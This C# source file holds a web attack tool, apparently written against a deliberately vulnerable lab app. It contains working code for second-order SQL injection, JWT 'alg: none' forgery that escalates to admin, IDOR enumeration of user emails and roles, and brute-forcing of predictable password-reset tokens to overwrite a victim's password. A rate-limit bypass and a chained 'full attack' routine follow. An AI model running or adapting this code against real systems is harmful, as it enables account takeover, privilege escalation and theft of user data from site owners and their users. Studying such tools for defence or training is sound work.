using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace ShadowStrike.Core
{
    public class AdvancedWebAttacker
    {
        private readonly HttpClient _httpClient;
        private readonly Action<string> _logCallback;

        public AdvancedWebAttacker(Action<string> logCallback = null)
        {
            _httpClient = new HttpClient();
            _logCallback = logCallback ?? Console.WriteLine;
        }

        // ============================================
        // 1. SECOND-ORDER SQL INJECTION
        // ============================================
        public async Task<bool> TestSecondOrderSQLi(string targetUrl)
        {
            _logCallback("[*] Testing Second-Order SQL Injection...");
            
            try
            {
                // Step 1: Register user with malicious username
                var maliciousUsername = "admin'--";
                var registerPayload = new
                {
                    username = maliciousUsername,
                    password = "test123",
                    email = "test@test.com"
                };

                var registerResponse = await PostJson($"{targetUrl}/api/auth?action=register", registerPayload);
                _logCallback($"[+] Registered user: {maliciousUsername}");

                // Step 2: Request password reset (triggers second-order SQLi)
                var resetPayload = new { username = maliciousUsername };
                var resetResponse = await PostJson($"{targetUrl}/api/auth?action=reset-request", resetPayload);
                
                if (resetResponse.Contains("reset"))
                {
                    _logCallback("[+] Second-Order SQLi SUCCESSFUL!");
                    _logCallback("[+] Malicious username stored and executed on password reset");
                    return true;
                }
            }
            catch (Exception ex)
            {
                _logCallback($"[-] Error: {ex.Message}");
            }

            return false;
        }

        // ============================================
        // 2. JWT TOKEN MANIPULATION
        // ============================================
        public async Task<bool> TestJWTAlgorithmConfusion(string targetUrl, string username, string password)
        {
            _logCallback("[*] Testing JWT Algorithm Confusion...");

            try
            {
                // Step 1: Login to get valid JWT
                var loginPayload = new { username, password };
                var loginResponse = await PostJson($"{targetUrl}/api/auth?action=login", loginPayload);
                
                var loginData = JsonSerializer.Deserialize<JsonElement>(loginResponse);
                var token = loginData.GetProperty("token").GetString();
                _logCallback($"[+] Got JWT token: {token.Substring(0, 20)}...");

                // Step 2: Decode JWT
                var parts = token.Split('.');
                if (parts.Length != 3)
                {
                    _logCallback("[-] Invalid JWT format");
                    return false;
                }

                var payload = DecodeBase64(parts[1]);
                _logCallback($"[+] Decoded payload: {payload}");

                // Step 3: Modify payload (escalate to admin)
                var payloadJson = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(payload);
                payloadJson["role"] = JsonSerializer.SerializeToElement("admin");
                
                var modifiedPayload = JsonSerializer.Serialize(payloadJson);
                var encodedPayload = EncodeBase64(modifiedPayload);

                // Step 4: Create token with algorithm "none"
                var manipulatedToken = $"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{encodedPayload}.";
                _logCallback($"[+] Manipulated token (alg: none): {manipulatedToken.Substring(0, 30)}...");

                // Step 5: Verify manipulated token
                var verifyPayload = new { token = manipulatedToken };
                var verifyResponse = await PostJson($"{targetUrl}/api/auth?action=verify", verifyPayload);

                if (verifyResponse.Contains("admin"))
                {
                    _logCallback("[+] JWT Algorithm Confusion SUCCESSFUL!");
                    _logCallback("[+] Escalated to admin role without valid signature");
                    return true;
                }
            }
            catch (Exception ex)
            {
                _logCallback($"[-] Error: {ex.Message}");
            }

            return false;
        }

        // ============================================
        // 3. IDOR (Insecure Direct Object Reference)
        // ============================================
        public async Task<List<Dictionary<string, string>>> EnumerateUsers(string targetUrl, int maxId = 100)
        {
            _logCallback("[*] Testing IDOR - Enumerating users...");
            var users = new List<Dictionary<string, string>>();

            try
            {
                for (int id = 1; id <= maxId; id++)
                {
                    var response = await _httpClient.GetStringAsync($"{targetUrl}/api/user?id={id}");
                    
                    if (response.Contains("\"success\":true"))
                    {
                        var userData = JsonSerializer.Deserialize<JsonElement>(response);
                        var user = userData.GetProperty("user");
                        
                        var userDict = new Dictionary<string, string>
                        {
                            ["id"] = user.GetProperty("id").ToString(),
                            ["username"] = user.GetProperty("username").GetString(),
                            ["email"] = user.GetProperty("email").GetString(),
                            ["role"] = user.GetProperty("role").GetString()
                        };

                        users.Add(userDict);
                        _logCallback($"[+] Found user #{id}: {userDict["username"]} ({userDict["role"]})");
                    }
                }

                _logCallback($"[+] IDOR Enumeration SUCCESSFUL! Found {users.Count} users");
            }
            catch (Exception ex)
            {
                _logCallback($"[-] Error: {ex.Message}");
            }

            return users;
        }

        // ============================================
        // 4. PREDICTABLE TOKEN CRACKING
        // ============================================
        public async Task<string> CrackPredictableToken(string targetUrl, string username, int userId)
        {
            _logCallback("[*] Testing Predictable Token Generation...");

            try
            {
                // Request password reset
                var resetPayload = new { username };
                await PostJson($"{targetUrl}/api/auth?action=reset-request", resetPayload);
                _logCallback("[+] Password reset requested");

                // Token format: base64(userId-timestamp)
                var currentTime = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                
                // Try timestamps within 10 seconds
                for (long offset = -10000; offset <= 10000; offset += 100)
                {
                    var timestamp = currentTime + offset;
                    var tokenString = $"{userId}-{timestamp}";
                    var predictedToken = Convert.ToBase64String(Encoding.UTF8.GetBytes(tokenString));

                    // Try to use the token
                    var resetPasswordPayload = new
                    {
                        token = predictedToken,
                        newPassword = "hacked123"
                    };

                    var response = await PostJson($"{targetUrl}/api/auth?action=reset-password", resetPasswordPayload);
                    
                    if (response.Contains("success"))
                    {
                        _logCallback($"[+] Predictable Token Cracking SUCCESSFUL!");
                        _logCallback($"[+] Cracked token: {predictedToken}");
                        return predictedToken;
                    }
                }
            }
            catch (Exception ex)
            {
                _logCallback($"[-] Error: {ex.Message}");
            }

            return null;
        }

        // ============================================
        // 5. RATE LIMIT BYPASS
        // ============================================
        public async Task<bool> TestRateLimitBypass(string targetUrl)
        {
            _logCallback("[*] Testing Rate Limit Bypass...");

            try
            {
                // Test 1: Normal requests (should get rate limited)
                for (int i = 0; i < 110; i++)
                {
                    var response = await _httpClient.GetStringAsync($"{targetUrl}/api/ratelimit");
                    if (response.Contains("Too many requests"))
                    {
                        _logCallback($"[+] Rate limited after {i} requests");
                        break;
                    }
                }

                // Test 2: Bypass with different User-Agent
                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Bypass)");

                var bypassResponse = await _httpClient.GetStringAsync($"{targetUrl}/api/ratelimit");
                if (bypassResponse.Contains("success"))
                {
                    _logCallback("[+] Rate Limit Bypass SUCCESSFUL!");
                    _logCallback("[+] Bypassed by changing User-Agent header");
                    return true;
                }
            }
            catch (Exception ex)
            {
                _logCallback($"[-] Error: {ex.Message}");
            }

            return false;
        }

        // ============================================
        // 6. COMPREHENSIVE ATTACK CHAIN
        // ============================================
        public async Task<Dictionary<string, bool>> ExecuteFullAttackChain(string targetUrl)
        {
            _logCallback("\n" + new string('=', 60));
            _logCallback("  ADVANCED WEB ATTACK - FULL CHAIN");
            _logCallback(new string('=', 60) + "\n");

            var results = new Dictionary<string, bool>();

            // Phase 1: IDOR Enumeration
            _logCallback("\n[PHASE 1] IDOR Enumeration");
            _logCallback(new string('-', 40));
            var users = await EnumerateUsers(targetUrl, 10);
            results["IDOR"] = users.Count > 0;

            // Phase 2: Second-Order SQLi
            _logCallback("\n[PHASE 2] Second-Order SQL Injection");
            _logCallback(new string('-', 40));
            results["SecondOrderSQLi"] = await TestSecondOrderSQLi(targetUrl);

            // Phase 3: JWT Algorithm Confusion
            _logCallback("\n[PHASE 3] JWT Algorithm Confusion");
            _logCallback(new string('-', 40));
            results["JWTConfusion"] = await TestJWTAlgorithmConfusion(targetUrl, "admin", "admin123");

            // Phase 4: Predictable Token Cracking
            _logCallback("\n[PHASE 4] Predictable Token Cracking");
            _logCallback(new string('-', 40));
            var crackedToken = await CrackPredictableToken(targetUrl, "admin", 1);
            results["TokenCracking"] = crackedToken != null;

            // Phase 5: Rate Limit Bypass
            _logCallback("\n[PHASE 5] Rate Limit Bypass");
            _logCallback(new string('-', 40));
            results["RateLimitBypass"] = await TestRateLimitBypass(targetUrl);

            // Summary
            _logCallback("\n" + new string('=', 60));
            _logCallback("  ATTACK SUMMARY");
            _logCallback(new string('=', 60));
            foreach (var result in results)
            {
                var status = result.Value ? "[✓] SUCCESS" : "[✗] FAILED";
                _logCallback($"{status} - {result.Key}");
            }
            _logCallback(new string('=', 60) + "\n");

            return results;
        }

        // ============================================
        // HELPER METHODS
        // ============================================
        private async Task<string> PostJson(string url, object payload)
        {
            var json = JsonSerializer.Serialize(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var response = await _httpClient.PostAsync(url, content);
            return await response.Content.ReadAsStringAsync();
        }

        private string DecodeBase64(string base64)
        {
            // Handle URL-safe base64
            base64 = base64.Replace('-', '+').Replace('_', '/');
            switch (base64.Length % 4)
            {
                case 2: base64 += "=="; break;
                case 3: base64 += "="; break;
            }
            var bytes = Convert.FromBase64String(base64);
            return Encoding.UTF8.GetString(bytes);
        }

        private string EncodeBase64(string text)
        {
            var bytes = Encoding.UTF8.GetBytes(text);
            return Convert.ToBase64String(bytes)
                .TrimEnd('=')
                .Replace('+', '-')
                .Replace('/', '_');
        }
    }
}
